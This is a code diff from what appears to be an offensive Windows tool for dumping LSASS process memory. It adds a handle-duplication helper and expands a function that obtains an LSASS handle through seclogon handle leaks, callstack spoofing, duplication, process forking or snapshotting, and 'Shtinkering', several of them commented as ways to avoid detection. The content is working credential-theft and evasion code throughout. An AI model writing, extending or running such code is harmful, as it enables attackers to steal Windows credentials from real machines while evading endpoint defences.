@@ -170,11 +170,13 @@ BOOL check_handle_privs(
             "The handle should have access permissions of 0x%lx but has 0x%lx",
             permissions,
             permissions & obj_info.GrantedAccess);
+        PRINT_ERR("Could not open a handle with the requested permissions");
     }
 
 cleanup:
     return ret_val;
 }
+
 
 /*
  * "The DuplicateHandle system call has an interesting behaviour
@@ -211,8 +213,200 @@ HANDLE make_handle_full_access(
     return hDuped;
 }
 
+HANDLE duplicate_handle_local(
+    IN HANDLE hProcess,
+    IN ACCESS_MASK DesiredAccess,
+    IN DWORD HandleAttributes)
+{
+    HANDLE hDuped = NULL;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    ULONG options = 0;
+
+    if (!hProcess)
+        goto cleanup;
+
+    if (!DesiredAccess)
+        options = DUPLICATE_SAME_ACCESS;
+
+    status = NtDuplicateObject(
+        NtCurrentProcess(),
+        hProcess,
+        NtCurrentProcess(),
+        &hDuped,
+        DesiredAccess,
+        HandleAttributes,
+        options);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDuplicateObject", status);
+        goto cleanup;
+    }
+
+    DPRINT(
+        "Duplicated handle: 0x%lx -> 0x%lx",
+        (DWORD)(ULONG_PTR)hProcess,
+        (DWORD)(ULONG_PTR)hDuped);
+
+cleanup:
+    if (hProcess)
+        NtClose(hProcess);
+
+    return hDuped;
+}
+
 // get a handle to LSASS via multiple methods
-HANDLE obtain_lsass_handle(
+BOOL obtain_lsass_handle(
+    OUT PHANDLE phProcess,
+    IN DWORD lsass_pid,
+    IN BOOL duplicate_handle,
+    IN BOOL duplicate_local,
+    IN BOOL use_seclogon_duplicate,
+    IN DWORD spoof_callstack,
+    IN BOOL is_seclogon_leak_local_stage_2,
+    IN LPCSTR seclogon_leak_remote_binary,
+    OUT PPROCESS_LIST* Pcreated_processes,
+    IN BOOL use_valid_sig,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    OUT PHANDLE PhSnapshot,
+    IN BOOL use_seclogon_leak_local,
+    IN BOOL use_seclogon_leak_remote,
+    IN BOOL use_lsass_shtinkering)
+{
+    BOOL   ret_val               = FALSE;
+    BOOL   success               = FALSE;
+    HANDLE hProcess              = NULL;
+    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
+    DWORD  duplicate_permissions = 0;
+    DWORD  attributes            = 0;
+    BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;
+
+    if (!phProcess)
+        return FALSE;
+
+    if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
+    {
+        success = malseclogon_handle_leak(
+            seclogon_leak_remote_binary,
+            dump_path,
+            fork_lsass,
+            snapshot_lsass,
+            use_valid_sig,
+            use_lsass_shtinkering,
+            use_seclogon_leak_local,
+            lsass_pid,
+            Pcreated_processes);
+        if (!success)
+            goto cleanup;
+        if (use_seclogon_leak_local)
+            return TRUE;
+    }
+
+    // --seclogon-leak-remote requires --duplicate internaly
+    if (use_seclogon_leak_remote)
+        duplicate_handle = TRUE;
+
+    // LSASS Shtinkering needs the handle to be inheritable
+    if (use_lsass_shtinkering)
+        attributes |= OBJ_INHERIT;
+
+    // fork and snapshot require LSASS_CLONE_PERMISSIONS
+    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
+    {
+        permissions = LSASS_CLONE_PERMISSIONS;
+    }
+    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
+    else if (use_lsass_shtinkering)
+    {
+        permissions = LSASS_SHTINKERING_PERMISSIONS;
+    }
+
+    // remember the permissions we needed
+    duplicate_permissions = permissions;
+
+    // if --duplicate-local was provided, we use PROCESS_QUERY_LIMITED_INFORMATION
+    if (duplicate_local)
+    {
+        permissions = PROCESS_QUERY_LIMITED_INFORMATION;
+    }
+
+    hProcess = open_handle_to_lsass(
+        lsass_pid,
+        permissions,
+        duplicate_handle,
+        use_seclogon_duplicate,
+        spoof_callstack,
+        is_seclogon_leak_local_stage_2,
+        dump_path,
+        attributes);
+    if (!hProcess)
+        goto cleanup;
+
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+        goto cleanup;
+
+    if (duplicate_local)
+    {
+        hProcess = duplicate_handle_local(
+            hProcess,
+            duplicate_permissions,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+    else if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering)
+            && use_seclogon_leak)
+    {
+        hProcess = make_handle_full_access(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+
+        success = check_handle_privs(hProcess, duplicate_permissions);
+        if (!success)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a fork
+    if (fork_lsass)
+    {
+        hProcess = fork_process(
+            hProcess,
+            attributes);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    // avoid reading LSASS directly by making a snapshot
+    if (snapshot_lsass)
+    {
+        hProcess = snapshot_process(
+            hProcess,
+            PhSnapshot);
+        if (!hProcess)
+            goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+    *phProcess = hProcess;
+
+cleanup:
+    if (!ret_val && hProcess)
+        NtClose(hProcess);
+
+    return ret_val;
+}
+
+
+HANDLE open_handle_to_lsass(
     IN DWORD lsass_pid,
     IN DWORD permissions,
     IN BOOL dup,
@@ -698,7 +892,7 @@ HANDLE snapshot_process(
     DWORD                  thread_flags;
     DWORD                  error_code;
 
-    if (!hProcess)
+    if (!hProcess || !hSnapshot)
         return NULL;
 
     // find the address of PssNtCaptureSnapshot dynamically
